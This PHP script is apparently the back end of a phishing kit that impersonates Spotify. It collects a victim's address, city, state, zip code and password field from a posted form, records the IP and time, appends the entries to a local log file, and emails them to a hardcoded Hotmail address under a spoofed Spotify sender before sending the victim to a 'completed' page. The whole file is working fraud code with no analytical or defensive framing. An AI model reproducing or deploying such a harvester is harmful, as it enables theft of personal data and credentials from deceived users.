<?php
error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
#Country info

$_SESSION['ad1'] = $_POST['ad1'];
$_SESSION['ci'] = $_POST['ci'];
$_SESSION['st'] = $_POST['st'];
$_SESSION['zc'] = $_POST['zc'];
$_SESSION['pw'] = $_POST['pw'];

#Security information
$message = "
<div style=\"background-image: url('https://i.ibb.co/dL40G43/C.jpg');font-family: Tahoma;line-height: 25px;color: #333;font-size: 22px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;\">
IP              =>   <font color='#F31414'>".$_SESSION['_IP_']."</font>
<br />
TIME	=>   <font color='#F31414'>".date('l jS \of F Y h:i:s A')."</font><br />
Dirección	=>   <font color='#F31414'>".$_POST['ad1']."</font><br />
Ciudad	=>   <font color='#F31414'>".$_POST['ci']."</font><br />
Estado	=>   <font color='#F31414'>".$_POST['st']."</font><br />
Zip Code	=>   <font color='#F31414'>".$_POST['zc']."</font><br />
</div>";

$fp = fopen('Swordfish.php', 'a');
fwrite($fp, "$message \r\n");
fclose($fp);

$subject  = "LOG C [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: Spotify <admin@Spotify.com.ve" . "\r\n";

$to = "yaspalugo@hotmail.com";
@mail($to,$subject,$message,$headers);
header('location: ../completed.html');

?>